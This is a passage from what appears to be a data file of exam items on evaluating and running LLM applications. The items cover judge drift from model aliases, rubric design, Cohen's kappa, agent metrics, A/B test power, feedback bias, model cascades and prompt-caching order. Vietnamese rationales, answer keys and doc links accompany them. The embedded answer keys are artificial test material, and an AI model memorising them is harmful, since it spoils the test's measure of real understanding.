    ask: "Over two weeks a team's quality score has climbed six points, although no prompt or model in the application changed. The team's judge is called through a model alias. Production metrics and human spot checks show no improvement. What is the most likely cause, and the best response?",
    scene: [
      "Điểm chất lượng tăng 6 điểm trong hai tuần. Ứng dụng không đổi prompt, không đổi model.",
      "Judge được gọi qua model alias (tên gọi tắt trỏ tới một phiên bản model).",
      "Chỉ số production và lượt kiểm tay của người đều không thấy gì tốt lên.",
      "Chỗ khó: hệ thống đứng yên mà điểm đổi, vậy thứ đổi là công cụ đo."
    ],
    asks: [
      "Nguyên nhân khả dĩ nhất là gì, xử lý sao?",
      "Tức là: nhận ra judge đã đổi, khóa nó lại, rồi đối chiếu với người trước khi tin điểm."
    ],
    facts: [
      "Docs “Model IDs and versioning”: alias của model trước thế hệ 4.6 (như <code>claude-sonnet-4-5</code>) trỏ tới snapshot có ngày mới nhất của dòng đó, nên có thể đổi. Từ thế hệ 4.6, ID không ngày là một snapshot cố định, bản mới ra dưới ID mới.",
      "Cùng trang: trọng số cố định theo ID, nhưng hạ tầng phục vụ quanh model có thể đổi và đôi khi làm hành vi lệch nhẹ. Nên pin phiên bản rồi vẫn cần mốc để đối chiếu.",
      "Anchor set (bộ mốc): một bộ ca cố định có nhãn của người. Chạy lại judge trên bộ này là thấy nó còn khớp người không.",
      "Bài “Demystifying evals for AI agents”: judge phải được hiệu chỉnh sát với chuyên gia người. Người chấm là thước gốc để kiểm judge."
    ],
    opts: [
      { k: "A", gist: "The human spot checks are unreliable, so stop doing them.",
        why: [
          "Sai: bỏ đúng cái thước đang chỉ ra vấn đề (ý 4).",
          "Kiểm tay của người khớp với chỉ số production. Thứ lệch là judge, không phải người."
        ] },
      { k: "B", gist: "Judge drift caused by the alias pointing to a new version: pin the judge's version, re-run a fixed anchor set labeled by humans to check agreement, and recalibrate before relying on the scores.",
        why: [
          "Đúng: hệ thống không đổi mà điểm đổi, judge lại gọi qua alias, nên khả dĩ nhất là alias đã trỏ sang bản mới (ý 1).",
          "Pin phiên bản để công cụ đo đứng yên. Chạy lại bộ mốc có nhãn người để đo judge còn khớp không, hiệu chỉnh xong mới tin điểm (ý 2, ý 3)."
        ] },
      { k: "C", gist: "The application really did improve, so update the dashboards and celebrate.",
        why: [
          "Sai: ứng dụng không đổi gì, production và kiểm tay đều không thấy tốt lên.",
          "Dễ bị cuốn vì điểm tăng là tin ai cũng muốn nghe. Nhưng hai nguồn khác cùng nói không có gì đổi, chỉ mỗi judge nói có."
        ] },
      { k: "D", gist: "The eval set has gone stale, so delete the oldest cases.",
        why: [
          "Sai: bộ eval cũ không giải thích được điểm tự tăng khi cả hệ thống lẫn bộ ca đều đứng yên.",
          "Xóa ca cũ còn làm mất luôn chỗ so trước sau, càng khó tìm nguyên nhân."
        ] }
    ],
    dispute: "Đáp án giữ B. Lưu ý với Claude: từ thế hệ 4.6, ID không ngày như <code>claude-sonnet-4-6</code> là snapshot cố định, không tự trôi. Chuyện “alias moved” (alias trỏ sang bản mới) chỉ đúng với alias của model trước 4.6 hoặc alias kiểu tương tự của nhà cung cấp khác. Docs (Model IDs and versioning) ghi rõ điểm này.",
    refs: [
      { label: "Docs Model IDs and versioning, mục “Dateless IDs are pinned snapshots”: alias đời trước trỏ sang snapshot mới nhất, ID từ 4.6 là snapshot cố định", href: "https://platform.claude.com/docs/en/about-claude/models/model-ids-and-versions#dateless-ids-are-pinned-snapshots" },
      { label: "Docs Model IDs and versioning, mục “Model weights versus serving infrastructure”: hạ tầng đổi có thể làm hành vi lệch nhẹ dù ID không đổi", href: "https://platform.claude.com/docs/en/about-claude/models/model-ids-and-versions#model-weights-versus-serving-infrastructure" },
      { label: "Bài Demystifying evals for AI agents, mục “Model-based graders”: judge phải hiệu chỉnh với người chấm", href: "https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents" }
    ]
  },
  {
    de: 1, n: 67, total: 100, sub: "5.2", subName: "Xây LLM judge",
    answer: "D",
    ask: "A summarization evaluator asks a judge to “give this summary an overall quality score from 1 to 10”. Two human reviewers working from the same prompt agree only moderately, and the judge's scores bunch up between 7 and 9. What is the best redesign?",
    scene: [
      "Prompt chấm tóm tắt chỉ có một câu: cho điểm “overall quality” (chất lượng tổng thể) từ 1 đến 10.",
      "Hai người chấm dùng đúng prompt đó mà chỉ đồng ý ở mức vừa phải. Điểm của judge dồn cục trong khoảng 7 đến 9.",
      "Chỗ khó: cả người lẫn judge đều chấm không ổn, nên lỗi nằm ở thang chấm, không nằm riêng ở judge."
    ],
    asks: [
      "Thiết kế lại thế nào là tốt nhất?",
      "Tức là: biến một câu hỏi mơ hồ thành các tiêu chí cụ thể mà người và judge chấm giống nhau."
    ],
    facts: [
      "Docs “Define success criteria and build evaluations”: tiêu chí tốt phải cụ thể (“accurate sentiment classification” thay vì “good performance”) và đo được.",
      "Cùng docs, phần hướng dẫn chấm bằng LLM khuyên ba điều. Một: rubric chi tiết, rõ ràng. Hai: chấm cụ thể, như chỉ trả “correct” hay “incorrect”, hoặc thang 1–5, vì đánh giá thuần định tính khó chấm nhanh ở quy mô lớn. Ba: bật thinking để judge suy luận trước khi ra điểm.",
      "Bài “Demystifying evals for AI agents”: rubric rõ, có cấu trúc cho từng mặt của bài, và chấm mỗi mặt bằng một judge riêng.",
      "Hai người còn không đồng ý là dấu hiệu rubric mơ hồ. Rubric như vậy thì judge cũng không ổn được."
    ],
    opts: [
      { k: "A", gist: "Treat the judge's score as ground truth because the human raters disagree, and keep the current monitoring.",
        why: [
          "Sai: người chấm lệch nhau là triệu chứng của rubric mơ hồ, không phải lý do bỏ người (ý 4).",
          "Lấy điểm judge làm chuẩn là mất luôn thước để kiểm judge. Judge dồn cục 7–9 thì chuẩn đó cũng chẳng phân biệt được gì."
        ] },
      { k: "B", gist: "Switch to a 1–100 scale so the judge has finer resolution.",
        why: [
          "Sai: thang mịn hơn không làm câu hỏi rõ hơn. Thêm mức chỉ thêm nhiễu, ngược với lời khuyên chấm cụ thể (ý 2).",
          "Dễ bị cuốn vì “resolution” (độ phân giải) nghe như chữa được chuyện dồn cục. Nhưng chưa rõ chấm theo gì thì 1–100 cũng dồn cục, chỉ dời sang 70–90."
        ] },
      { k: "C", gist: "Keep the single score but have the judge explain its reasoning at length.",
        why: [
          "Sai: giải thích dài không sửa được rubric mơ hồ. Judge vẫn phải tự đoán “quality” là gì (ý 1).",
          "Cho judge suy luận trước khi chấm là điều docs có khuyên, nhưng nó giúp chấm tốt hơn trên rubric rõ, không thay cho rubric (ý 2)."
        ] },
      { k: "D", gist: "Break quality into specific criteria such as faithfulness, coverage and concision, define each with anchored examples, score them separately, and prefer binary or narrow scales.",
        why: [
          "Đúng: tách “quality” thành tiêu chí cụ thể như faithfulness (trung thành với bản gốc), coverage (đủ ý), concision (gọn) (ý 1, ý 3).",
          "Mỗi tiêu chí có ví dụ mốc, chấm riêng, thang nhị phân hoặc hẹp: đúng điều docs khuyên (ý 2). Người và judge chấm giống nhau hơn vì cùng biết đang chấm cái gì."
        ] }
    ],
    refs: [
      { label: "Docs Define success criteria and build evaluations, mục “Tips for LLM-based grading”: rubric chi tiết, chấm cụ thể (correct/incorrect hoặc thang 1–5), cho judge suy luận", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#tips-for-llm-based-grading" },
      { label: "Bài Demystifying evals for AI agents, mục “Model-based graders”: rubric có cấu trúc cho từng mặt, mỗi mặt một judge riêng", href: "https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents" }
    ]
  },
  {
    de: 1, n: 68, total: 100, sub: "5.2", subName: "Xây LLM judge",
    answer: "BE",
    ask: "A team measures inter-rater reliability on a rubric where 95% of examples pass and 5% fail. Which two practices are sound? (Choose two.)",
    scene: [
      "Team đo inter-rater reliability (độ tin cậy giữa những người chấm) cho một rubric.",
      "Dữ liệu lệch hẳn: 95% ví dụ đạt, chỉ 5% không đạt.",
      "Chỗ khó: dữ liệu lệch như vậy thì con số đồng thuận thô rất dễ cao mà chẳng nói lên gì."
    ],
    asks: [
      "Hai cách làm nào đúng?",
      "Tức là: đo đồng thuận sao cho không bị dữ liệu lệch đánh lừa, và có mốc người để so judge."
    ],
    facts: [
      "Percent agreement (tỉ lệ đồng thuận thô): phần trăm ca hai bên chấm giống nhau. Dữ liệu 95% đạt thì một người ghi “đạt” cho mọi ca vẫn khớp người chấm đúng tới 95%, dù không bắt được ca hỏng nào.",
      "Cohen's kappa trừ đi phần khớp do may, tính theo tỉ lệ từng nhãn. Người ghi “đạt” hết như trên có kappa bằng 0.",
      "Đồng thuận giữa người với người là trần: rubric làm người còn lệch nhau thì không thể mong judge khớp người hơn mức đó. Con số này cũng cho biết rubric đã rõ chưa.",
      "Bài “Demystifying evals for AI agents” coi inter-annotator agreement (đồng thuận giữa người gắn nhãn) là một cách chấm bằng người, và người chấm được dùng để hiệu chỉnh judge."
    ],
    opts: [
      { k: "A", gist: "Rely only on percent agreement, since 95% agreement is good by definition.",
        why: [
          "Sai: 95% ở đây có thể chỉ là ghi “đạt” cho mọi ca (ý 1).",
          "Dễ bị cuốn vì 95% trông rất cao. Nhưng với dữ liệu 95/5, đó đúng bằng mức của người không phân biệt gì cả."
        ] },
      { k: "B", gist: "Measure agreement between human annotators first, because it caps how well any judge can be expected to agree with them.",
        why: [
          "Đúng: đo người với người trước để biết trần (ý 3).",
          "Người còn lệch nhau nhiều thì phải sửa rubric trước, chưa nói gì tới judge."
        ] },
      { k: "C", gist: "Use a single annotator, because a second one only adds cost.",
        why: [
          "Sai: một người gắn nhãn thì không có gì để đo độ tin cậy. Đồng thuận cần ít nhất hai người (ý 3).",
          "Tiết kiệm được tiền nhưng mất luôn trần để so judge."
        ] },
      { k: "D", gist: "Treat the judge's labels as the truth whenever humans disagree with them.",
        why: [
          "Sai: làm ngược. Judge là thứ đang cần kiểm, người là thước gốc (ý 4).",
          "Coi nhãn judge là đúng mỗi khi lệch người thì judge lúc nào cũng “đúng”, việc kiểm judge mất nghĩa."
        ] },
      { k: "E", gist: "Report a chance-corrected statistic such as Cohen's kappa next to percent agreement, because with imbalanced classes raw agreement can be high purely by chance.",
        why: [
          "Đúng: kappa trừ phần khớp do may, nên với dữ liệu lệch nó lộ ra người chấm không phân biệt được gì (ý 2).",
          "Báo kèm tỉ lệ thô vẫn có ích để đọc, nhưng quyết dựa vào con số đã trừ may."
        ] }
    ],
    refs: [
      { label: "Bài Demystifying evals for AI agents, mục “Human graders” và “Model-based graders”: inter-annotator agreement, dùng người để hiệu chỉnh judge", href: "https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents" },
      { label: "Docs Define success criteria and build evaluations, mục “Grade your evaluations”: chấm bằng LLM phải kiểm độ tin cậy trước rồi mới mở rộng", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#grade-your-evaluations" }
    ]
  },
  {
    de: 1, n: 69, total: 100, sub: "5.3", subName: "Đo chất lượng trên lưu lượng thật",
    answer: "A",
    ask: "A team runs a coding-and-tools agent that carries out multi-step tasks for users. Right now they measure online quality with a judge that rates how fluent the final message is. Which set of metrics suits an agentic task better?",
    scene: [
      "Agent viết code và gọi tool, làm việc nhiều bước cho user.",
      "Đang đo chất lượng online (trên lưu lượng thật) bằng một judge chấm độ trôi chảy của tin nhắn cuối.",
      "Chỗ khó: agent có thể viết tin cuối rất mượt mà việc thật thì chưa xong. Đo câu chữ là đo nhầm thứ."
    ],
    asks: [
      "Bộ chỉ số nào hợp hơn với việc của agent?",
      "Tức là: đo việc có xong thật không, tốn bao nhiêu để xong, và đọc lại cách nó làm."
    ],
    facts: [
      "Bài “Demystifying evals for AI agents”: outcome (kết quả) là trạng thái cuối của môi trường sau lượt chạy. Thường nên chấm cái agent làm ra, không chấm con đường nó đi.",
      "Cùng bài: độ trễ, lượng token, chi phí mỗi việc, tỉ lệ lỗi theo dõi được trên một bộ việc cố định. Có thể đặt ràng buộc trên transcript (bản ghi lượt chạy), như xong trong dưới 10 lượt.",
      "Cùng bài: không đọc transcript và điểm của nhiều lượt chạy thì không biết grader có chấm đúng không.",
      "Trajectory (quỹ đạo): chuỗi bước, lời gọi tool và kết quả mà agent đi qua trong một lượt. Đọc mẫu quỹ đạo thấy được chỗ vòng vo, thử lại, hay đi tắt."
    ],
    opts: [
      { k: "A", gist: "Task success checked against a verifiable outcome, plus steps, retries and cost per completed task, together with review of sampled trajectories.",
        why: [
          "Đúng: task success đo bằng kết quả kiểm được, ví dụ test chạy qua hay file đổi đúng, đúng thứ user cần (ý 1).",
          "Số bước, số lần thử lại, chi phí mỗi việc xong cho biết hiệu quả (ý 2). Đọc mẫu quỹ đạo bắt được chỗ con số không thấy (ý 3, ý 4)."
        ] },
      { k: "B", gist: "How many tools the agent called, where more is better.",
        why: [
          "Sai: nhiều lời gọi tool thường là vòng vo, thử đi thử lại, không phải làm tốt hơn (ý 4).",
          "Dễ bị cuốn vì nghe như đo “agent làm việc chăm”. Nhưng chỉ số này thưởng đúng cho hành vi tốn tiền mà mày muốn giảm (ý 2)."
        ] },
      { k: "C", gist: "Average length of the final message, on the idea that longer means more complete.",
        why: [
          "Sai: dài không phải đúng. Tin dài vẫn có thể báo xong một việc chưa xong (ý 1).",
          "Còn tệ hơn đo trôi chảy: khuyến khích agent viết dông dài."
        ] },
      { k: "D", gist: "How fast the user types after the response.",
        why: [
          "Sai: tốc độ gõ của user chẳng liên quan gì tới việc agent có làm xong không.",
          "Không có cách nào nối con số này về kết quả của việc (ý 1)."
        ] }
    ],
    refs: [
      { label: "Bài Demystifying evals for AI agents: chấm outcome (trạng thái cuối) thay vì câu chữ, theo dõi token và chi phí mỗi việc, đọc transcript của nhiều lượt", href: "https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents" },
      { label: "Docs Define success criteria and build evaluations, mục “Common success criteria”: task fidelity, latency, price là các mặt cần đo", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#common-success-criteria" }
    ]
  },
  {
    de: 1, n: 70, total: 100, sub: "5.3", subName: "Đo chất lượng trên lưu lượng thật",
    answer: "C",
    ask: "A product manager wants to ship a new prompt: over two days and 600 sessions the thumbs-up rate went from 71% to 73%, while cost per session rose 25%. Neither a success metric nor a sample size was set beforehand. What is the best response?",
    scene: [
      "PM muốn ra prompt mới. Số liệu: hai ngày, 600 phiên, tỉ lệ like (thumbs-up) từ 71% lên 73%.",
      "Cùng lúc đó chi phí mỗi phiên tăng 25%. Không ai chốt trước chỉ số thành công hay cỡ mẫu.",
      "Ví dụ minh họa: giả sử chia đều 300 phiên mỗi bên, sai số chuẩn của chênh lệch hai tỉ lệ quanh 72% là khoảng 3,7 điểm, khoảng tin cậy 95% cỡ ±7 điểm. Chênh 2 điểm nằm gọn trong đó.",
      "Chỗ khó: 2 điểm trông như tiến bộ, nhưng với 600 phiên thì rất có thể chỉ là nhiễu."
    ],
    asks: [
      "Phản hồi thế nào là tốt nhất?",
      "Tức là: dựng lại phép thử cho đúng, chốt chỉ số và cỡ mẫu trước, và cân cả chi phí trước khi quyết."
    ],
    facts: [
      "Docs “Define success criteria and build evaluations”: bắt đầu bằng tiêu chí thành công cụ thể, đo được. Latency (độ trễ) và price (chi phí) cũng nằm trong các tiêu chí phổ biến.",
      "Bài “A statistical approach to model evaluations”: báo sai số chuẩn kèm mỗi điểm, khoảng tin cậy 95% là trung bình cộng trừ 1,96 lần sai số chuẩn. Power analysis (phân tích độ nhạy) cho biết cần bao nhiêu mẫu để phát hiện được một mức chênh.",
      "Guardrail metric (chỉ số chặn): không phải mục tiêu chính nhưng không được xấu đi quá mức cho phép, như chi phí, độ trễ."
    ],
    opts: [
      { k: "A", gist: "Flip the decision rule: ship only if cost goes down, no matter what happens to quality.",
        why: [
          "Sai: chỉ nhìn chi phí, bỏ hẳn chất lượng. Đổi chiều luật quyết định không sửa được chuyện chưa có thiết kế thử (ý 1).",
          "Theo luật này thì prompt rẻ mà tệ cũng được ra."
        ] },
      { k: "B", gist: "Cancel the test, because A/B testing does not apply to language models.",
        why: [
          "Sai: A/B test dùng bình thường cho thay đổi prompt hay model. Thứ hỏng ở đây là thiết kế phép thử, không phải phương pháp.",
          "Hủy là bỏ luôn cách để biết prompt mới có tốt hơn thật không."
        ] },
      { k: "C", gist: "Set the primary metric and required sample size up front, extend the test until it has adequate power, and treat cost and latency as guardrail metrics before deciding.",
        why: [
          "Đúng: chốt chỉ số chính và cỡ mẫu trước (ý 1, ý 2), chạy tới khi đủ độ nhạy để nếu chênh 2 điểm là thật thì thấy được.",
          "Chi phí, độ trễ thành chỉ số chặn (ý 3): mức tăng 25% phải được cân trước khi ra, không để lọt vì chất lượng nhích một chút."
        ] },
      { k: "D", gist: "Ship it, since quality went up and users prefer the new version.",
        why: [
          "Sai: chênh 2 điểm trên 600 phiên chưa tách được khỏi nhiễu (ý 2). “Users prefer” (user thích hơn) là chưa chứng minh.",
          "Dễ bị cuốn vì số đi đúng chiều và PM đang muốn ra. Nhưng chi phí tăng 25% là chắc, còn lợi ích thì chưa chắc."
        ] }
    ],
    refs: [
      { label: "Bài A statistical approach to model evaluations, mục “Recommendation #1: Use the Central Limit Theorem” và “Recommendation #5: Use power analysis”: khoảng tin cậy, tính cỡ mẫu trước khi chạy", href: "https://www.anthropic.com/research/statistical-approach-to-model-evals" },
      { label: "Docs Define success criteria and build evaluations, mục “Common success criteria”: latency và price cũng là tiêu chí phải đo", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#common-success-criteria" }
    ]
  },
  {
    de: 1, n: 71, total: 100, sub: "5.3", subName: "Đo chất lượng trên lưu lượng thật",
    answer: "B",
    ask: "A support assistant gets a thumbs rating on only about 1% of sessions, and most of those ratings are negative. Engineers suspect this feedback does not represent typical sessions. Which approach gives a more reliable picture of live quality?",
    scene: [
      "Trợ lý hỗ trợ khách hàng đang chạy thật. Chỉ khoảng 1% phiên có người bấm thích/không thích (thumbs rating), mà phần lớn là không thích.",
      "Kỹ sư lo phản hồi này “unrepresentative” (không đại diện): ai bực mới bấm, phiên ổn thì im.",
      "Chỗ khó: tín hiệu duy nhất đang có lại lệch. Phải tìm cách đo không phụ thuộc vào việc người dùng tự bấm."
    ],
    asks: [
      "Cách nào cho bức tranh đáng tin hơn về chất lượng lúc chạy thật?",
      "Tức là: đo trên mẫu đại diện cho toàn bộ lưu lượng, chấm được ở quy mô lớn, và vẫn có người kiểm.",
      "Soi từng phương án theo ba câu: mẫu có lệch không, ai chấm, và chấm xong có quay về làm bộ test tốt hơn không."
    ],
    facts: [
      "Bài “Demystifying evals for AI agents” của Anthropic xếp phản hồi người dùng vào loại thưa và tự chọn (“sparse and self-selected”), lại nghiêng về lỗi nặng. Dựa chủ yếu vào người dùng để bắt lỗi thì người dùng chịu thiệt trước.",
      "Lấy mẫu ngẫu nhiên (random sampling) trên lưu lượng thật bỏ được thiên lệch tự chọn: phiên nào cũng có cơ hội được chấm như nhau.",
      "Giám khảo LLM (LLM-as-judge) chấm được nhiều, nhưng bài trên dặn phải hiệu chỉnh sát với chuyên gia người, và vẫn cho người xem lại định kỳ. Docs đánh giá của Anthropic cũng khuyên chấm bằng model khác với model sinh ra câu trả lời.",
      "Lỗi bắt được ngoài thực tế nên đổi thành ca test cho bộ đánh giá offline, để bộ test phản ánh cách dùng thật."
    ],
    opts: [
      { k: "A", gist: "Treat the thumbs-down rate by itself as the quality metric.",
        why: [
          "Sai ở mẫu: 1% phiên, lại toàn người bực, là mẫu nhỏ và lệch (ý 1).",
          "Tỉ lệ thumbs-down chỉ cho biết trong số người chịu bấm thì bao nhiêu người không vui. Nó không nói được 99% phiên còn lại ra sao.",
          "Dễ bị cuốn vì đây là con số có sẵn, đo được ngay. Nhưng chính đề đã nói kỹ sư lo nó không đại diện."
        ] },
      { k: "B", gist: "Randomly sample production traffic along with the flagged cases, grade it with a calibrated judge plus periodic human review, combine that with the feedback signals, and send failures into the offline eval suite.",
        why: [
          "Đúng: mẫu ngẫu nhiên bỏ thiên lệch tự chọn (ý 2). Ca bị gắn cờ được thêm vào để không bỏ sót lỗi đã biết.",
          "Giám khảo đã hiệu chỉnh cho phép chấm nhiều, người xem lại định kỳ giữ cho giám khảo không trôi (ý 3). Phản hồi người dùng vẫn giữ làm tín hiệu phụ, không bỏ đi.",
          "Lỗi tìm được quay về bộ test offline (ý 4), nên lần sau đổi prompt hay model là bắt được trước khi ra thật."
        ] },
      { k: "C", gist: "After every answer, ask the model whether its own answer was correct and log what it says.",
        why: [
          "Sai ở người chấm: model tự chấm bài của chính nó, không phải bằng chứng độc lập, cũng chưa hiệu chỉnh với ai (ý 3).",
          "Model trả lời sai mà tưởng mình đúng thì tự chấm cũng ra “đúng”. Đúng loại lỗi cần bắt lại lọt."
        ] },
      { k: "D", gist: "Hold off on measuring until feedback volume grows on its own.",
        why: [
          "Sai vì trong lúc chờ không ai đo chất lượng. Lỗi vẫn tới tay người dùng trước (ý 1).",
          "Phản hồi nhiều lên thì vẫn là phản hồi tự chọn. Chờ thêm không sửa được độ lệch."
        ] }
    ],
    refs: [
      { label: "Bài Anthropic “Demystifying evals for AI agents”, mục “How evals fit with other methods for a holistic understanding of agents”: phản hồi người dùng thưa và tự chọn, giám khảo LLM phải hiệu chỉnh với người, lỗi thực tế đổi thành ca test", href: "https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents" },
      { label: "Docs Define success criteria and build evaluations, mục “Build evaluations”: bộ đánh giá phản ánh phân bố việc thật, chấm bằng model khác với model sinh ra câu trả lời", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#build-evaluations" }
    ]
  },
  {
    de: 1, n: 72, total: 100, sub: "6.1", subName: "Kiến trúc chi phí",
    answer: "D",
    ask: "Usage data for a support assistant shows that 70% of tickets are short, routine questions, yet every request goes to the most capable model. Cost is the team's biggest concern, and quality must not decline. Which strategy fits best?",
    scene: [
      "Trợ lý hỗ trợ: 70% ticket là câu hỏi ngắn, quen thuộc. Hiện mọi request đều vào model mạnh nhất.",
      "Hai ràng buộc cùng lúc: chi phí là mối lo số một, và “quality must not drop” (chất lượng không được giảm).",
      "Chỗ khó: cắt chi phí thì dễ. Cắt mà không hạ chất lượng ở 30% ticket khó mới là đề bài."
    ],
    asks: [
      "Chiến lược nào tốt nhất?",
      "Tức là: dồn phần dễ chiếm số đông sang model rẻ, giữ model mạnh cho phần khó, và có cách chứng minh chất lượng không tụt.",
      "Soi từng phương án theo ba câu: chia theo cái gì, ca khó có tới được model mạnh không, và lấy gì kiểm chất lượng."
    ],
    facts: [
      "Docs “Choosing the right model” có cách bắt đầu efficiency-first (ưu tiên hiệu quả): dùng model nhanh, rẻ như Haiku cho việc khối lượng lớn, đơn giản, chỉ nâng cấp khi thiếu năng lực ở chỗ cụ thể.",
      "Cũng docs đó, mục “Combine models”: ghép model rẻ với model mạnh để phần lớn token tính theo giá thấp. Docs “Optimizing for cost and intelligence” mô tả mẫu advisor: model nhỏ chạy vòng chính, gặp chỗ khó mới hỏi model mạnh.",
      "Cũng docs “Optimizing for cost and intelligence”: khi kết quả kiểm được, chạy mọi việc ở mức rẻ rồi chỉ chạy lại ca hỏng ở mức cao hơn. Muốn vậy cần tín hiệu hỏng đáng tin, vì bộ kiểm cho qua bài sai thì ca hỏng lọt luôn.",
      "Đổi model phải đo bằng bộ đánh giá (evals) trên prompt và dữ liệu thật: so độ chính xác, chất lượng, ca biên, rồi mới cân chi phí."
    ],
    opts: [
      { k: "A", gist: "Route requests based only on the customer's plan tier, ignoring how hard each ticket is.",
        why: [
          "Sai ở tiêu chí chia: gói cước (plan tier) nói khách trả bao nhiêu, không nói ticket khó cỡ nào.",
          "Khách gói rẻ hỏi câu khó vẫn rơi vào model yếu, chất lượng tụt. Khách gói đắt hỏi câu dễ vẫn tốn tiền model mạnh."
        ] },
      { k: "B", gist: "Send requests to models at random so the cost evens out across the fleet.",
        why: [
          "Sai vì chia ngẫu nhiên không nhìn độ khó: ticket khó có thể vào model yếu, ticket dễ vẫn vào model đắt.",
          "Chi phí trung bình có giảm, nhưng chất lượng ca khó tụt ngẫu nhiên. Trái ràng buộc chất lượng không được giảm."
        ] },
      { k: "C", gist: "Put all traffic on the smallest model and accept lower quality on the harder tickets.",
        why: [
          "Rẻ nhất, nhưng tự nhận chấp nhận chất lượng giảm ở ticket khó. Trái thẳng ràng buộc của đề.",
          "Dễ bị cuốn vì đề nói chi phí là mối lo số một. Nhưng mối lo số một không xóa ràng buộc thứ hai."
        ] },
      { k: "D", gist: "Use a cascade: a smaller model takes routine tickets and escalates to the larger model when confidence is low or validation fails, with evals confirming quality at each tier.",
        why: [
          "Đúng: cascade (chuỗi tầng) cho 70% ticket dễ chạy ở giá model nhỏ, đúng tinh thần efficiency-first và ghép model (ý 1, ý 2).",
          "Ca khó không mất: kiểm tra hỏng hoặc độ tin thấp thì đẩy lên model lớn (ý 3). Trong hai tín hiệu này, kiểm tra đầu ra (validation) chắc hơn độ tự tin model tự khai.",
          "Evals cho từng tầng là bằng chứng chất lượng không tụt (ý 4). Không có nó thì “không giảm chất lượng” chỉ là hy vọng."
        ] }
    ],
    refs: [
      { label: "Docs Choosing the right model, mục “Option 1: Start efficiency-first” và “Combine models”: bắt đầu bằng model rẻ cho việc đơn giản, ghép model rẻ với model mạnh", href: "https://platform.claude.com/docs/en/about-claude/models/choosing-a-model#combine-models" },
      { label: "Docs Optimizing for cost and intelligence, mục “Re-run failures at higher effort”: chạy rẻ trước, chỉ đẩy ca hỏng lên mức cao, cần tín hiệu hỏng đáng tin", href: "https://platform.claude.com/docs/en/about-claude/models/optimizing-for-cost-and-intelligence#re-run-failures-at-higher-effort" }
    ]
  },
  {
    de: 1, n: 73, total: 100, sub: "6.1", subName: "Kiến trúc chi phí",
    answer: "C",
    ask: "A document Q&A feature starts its prompt with the user's name, the current date, and the session id, followed by a 25k-token policy manual that is the same for every user. Cache read tokens are almost zero. Which change most improves the cache hit rate?",
    scene: [
      "Prompt hiện xếp: tên người dùng, ngày, session id ở đầu, rồi mới tới sổ tay chính sách 25k token giống hệt cho mọi người.",
      "Cache read tokens (số token đọc từ cache) gần như bằng 0: cache gần như không trúng lần nào.",
      "Chỗ khó: phần to và cố định thì có, nhưng nó nằm sau phần thay đổi theo từng request.",
      "Ví dụ minh họa: <pre><code>[An | 20/11 | sess-81] + [sổ tay 25k]\n[Bình | 20/11 | sess-82] + [sổ tay 25k]</code></pre> Hai request khác nhau ngay từ những token đầu tiên."
    ],
    asks: [
      "Đổi gì để tăng tỉ lệ trúng cache nhiều nhất?",
      "Tức là: sắp lại prompt để phần giống nhau giữa mọi request nằm liền ở đầu, và đặt điểm cache ở cuối phần đó."
    ],
    facts: [
      "Prompt caching khớp theo tiền tố (prefix): cache chỉ trúng khi đoạn prompt từ đầu tới block có <code>cache_control</code> giống 100%. Thứ tự tiền tố là <code>tools</code>, rồi <code>system</code>, rồi <code>messages</code>.",
      "Docs dặn để nội dung tĩnh (định nghĩa tool, chỉ dẫn, ngữ cảnh, ví dụ) ở đầu. Phần thay đổi (thời gian, ngữ cảnh từng request) để sau, và đặt breakpoint (điểm đánh dấu cache) ở cuối phần tĩnh, không đặt lên block thay đổi.",
      "<code>cache_read_input_tokens</code> là số token lấy từ cache trong request đó. Gần 0 nghĩa là gần như request nào cũng xử lý lại từ đầu."
    ],
    opts: [
      { k: "A", gist: "Cut the manual down so it takes fewer tokens.",
        why: [
          "Sai chỗ: cache trượt vì đầu prompt khác nhau mỗi request, không vì sổ tay dài (ý 1).",
          "Rút ngắn chỉ bớt số token phải trả giá đầy đủ, cache vẫn trượt như cũ. Còn có thể mất nội dung chính sách mà câu trả lời cần."
        ] },
      { k: "B", gist: "Use the same user name and date for every user.",
        why: [
          "Có làm phần đầu giống nhau hơn, nhưng bằng cách phá dữ liệu tính năng cần: câu trả lời không còn biết ai hỏi, hỏi ngày nào.",
          "Session id vẫn khác nhau, nên tiền tố vẫn lệch ngay đầu (ý 1).",
          "Dễ bị cuốn vì nó nhắm đúng nguyên nhân (phần đầu thay đổi). Nhưng cách sửa đúng là dời phần thay đổi ra sau, không phải xóa nó."
        ] },
      { k: "C", gist: "Put the static manual at the start, follow it with the per-user and per-request values, and set the cache breakpoint right after the static part.",
        why: [
          "Đúng cách docs chỉ: phần tĩnh lên đầu, phần thay đổi ra sau, breakpoint ở cuối phần tĩnh (ý 2).",
          "Giờ 25k token sổ tay là tiền tố chung của mọi request, nên trong thời gian cache còn sống các request sau đều trúng (ý 1). <code>cache_read_input_tokens</code> sẽ lên gần 25k mỗi lần (ý 3)."
        ] },
      { k: "D", gist: "Repeat the whole manual a second time at the end of the prompt.",
        why: [
          "Sai: tiền tố vẫn bắt đầu bằng tên, ngày, session id, nên vẫn trượt (ý 1).",
          "Còn tốn thêm 25k token mỗi request. Phần sổ tay tốn gấp đôi mà cache không trúng hơn chút nào."
        ] }
    ],
    refs: [
      { label: "Docs Prompt caching, mục “Structuring your prompt”: để nội dung tĩnh ở đầu, breakpoint ở cuối phần tĩnh, phần thay đổi ra sau", href: "https://platform.claude.com/docs/en/build-with-claude/prompt-caching#structuring-your-prompt" },
      { label: "Docs Prompt caching, mục “Tracking cache performance”: đọc trường cache_read_input_tokens để biết cache có trúng không", href: "https://platform.claude.com/docs/en/build-with-claude/prompt-caching#tracking-cache-performance" }
    ]
  },
  {
    de: 1, n: 74, total: 100, sub: "6.1", subName: "Kiến trúc chi phí",
    answer: "A",
    ask: "A team runs two workloads on the real-time API: a weekly job that tags 500,000 archived records, with results needed within a few days, and a live agent-assist tool that must answer within seconds. They want to cut cost without hurting the live tool. Which decision is best?",
    scene: [
      "Hai việc cùng chạy trên API thời gian thực (real-time API).",
